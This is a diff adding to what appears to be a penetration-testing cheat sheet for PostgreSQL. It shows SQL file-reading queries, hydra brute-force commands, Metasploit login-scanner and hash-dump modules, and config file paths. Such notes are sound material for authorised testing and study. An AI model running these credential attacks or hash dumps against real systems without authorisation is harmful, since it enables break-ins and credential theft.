@@ -21,3 +21,32 @@ SELECT pg_ls_dir('/home/wilson');
 SELECT pg_read_file('/home/wilson/local.txt');
 ```
 
+### Brute Force Credentials
+```bash
+hydra -l username -P passwords.txt <target-ip> postgres
+hydra -L usernames.txt -p password <target-ip> postgres
+
+# Metasploit
+msfconsole
+msf> use auxiliary/scanner/postgres/postgres_login
+msf> set rhosts <target-ip>
+msf> run
+```
+
+### Dump User Hashes
+```bash
+msfconsole
+msf> use auxiliary/scanner/postgres/postgres_hashdump
+msf> set rhosts <target-ip>
+msf> set username <username>
+msf> set password <password>
+msf> run
+```
+
+## Config File
+```bash
+# Version 14.x
+/etc/postgresql/14/main/postgresql.conf
+# Version 15.x
+/etc/postgresql/15/main/postgresql.conf
+```
